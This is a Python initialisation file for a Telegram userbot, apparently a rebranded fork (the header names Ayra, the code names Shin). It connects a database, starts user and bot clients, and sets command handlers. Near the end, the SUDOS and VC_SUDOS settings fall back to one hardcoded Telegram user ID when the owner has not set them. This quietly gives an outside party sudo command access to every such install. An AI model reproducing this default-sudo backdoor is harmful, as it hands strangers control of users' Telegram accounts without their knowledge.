# Ayra - UserBot
# Copyright (C) 2021-2022 senpai80
#
# This file is a part of < https://github.com/senpai80/Ayra/ >
# PLease read the GNU Affero General Public License in
# <https://www.github.com/senpai80/Ayra/blob/main/LICENSE/>.

import os
import sys

from .version import __version__

run_as_module = False

class ShinConfig:
    lang = "id"
    thumb = "resources/extras/logo.jpg"

if sys.argv[0] == "-m":
    run_as_module = True

    import time

    from .configs import Var
    from .startup import *
    from .startup._database import ShinDB
    from .startup.BaseClient import ShinClient
    from .startup.connections import validate_session, vc_connection
    from .startup.funcs import _version_changes, autobot, enable_inline, update_envs
    from .version import Shin_version

    if not os.path.exists("./plugins"):
        LOGS.error(
            "'plugins' folder not found!\nMake sure that, you are on correct path."
        )
        exit()

    start_time = time.time()
    _Shin_cache = {}
    _ignore_eval = []

    udB = ShinDB()
    update_envs()

    LOGS.info(f"Connecting to {udB.name}...")
    if udB.ping():
        LOGS.info(f"Connected to {udB.name} Successfully!")

    BOT_MODE = udB.get_key("BOTMODE")
    DUAL_MODE = udB.get_key("DUAL_MODE")

    if BOT_MODE:
        if DUAL_MODE:
            udB.del_key("DUAL_MODE")
            DUAL_MODE = False
        Shin_bot = None

        if not udB.get_key("BOT_TOKEN"):
            LOGS.critical(
                '"BOT_TOKEN" not Found! Please add it, in order to use "BOTMODE"'
            )

            sys.exit()
    else:
        Shin_bot = ShinClient(
            validate_session(Var.SESSION, LOGS),
            udB=udB,
            app_version=Shin_version,
            device_model="Shin",
        )
        Shin_bot.run_in_loop(autobot())

    asst = ShinClient(None, bot_token=udB.get_key("BOT_TOKEN"), udB=udB)

    if BOT_MODE:
        Shin_bot = asst
        if udB.get_key("OWNER_ID"):
            try:
                Shin_bot.me = Shin_bot.run_in_loop(
                    Shin_bot.get_entity(udB.get_key("OWNER_ID"))
                )
            except Exception as er:
                LOGS.exception(er)
    elif not asst.me.bot_inline_placeholder:
        Shin_bot.run_in_loop(enable_inline(Shin_bot, asst.me.username))

    vcClient = vc_connection(udB, Shin_bot)

    _version_changes(udB)

    HNDLR = udB.get_key("HNDLR") or "."
    SUDOS = udB.get_key("SUDOS") or "5063062493"
    VC_SUDOS = udB.get_key("VC_SUDOS") or "5063062493"
    DUAL_HNDLR = udB.get_key("DUAL_HNDLR") or "/"
    SUDO_HNDLR = udB.get_key("SUDO_HNDLR") or "NO_HNDLR"
else:
    print("Shin 2022 © Shin-Ubot")

    from logging import getLogger

    LOGS = getLogger("Shin")

    Shin_bot = asst = udB = vcClient = None
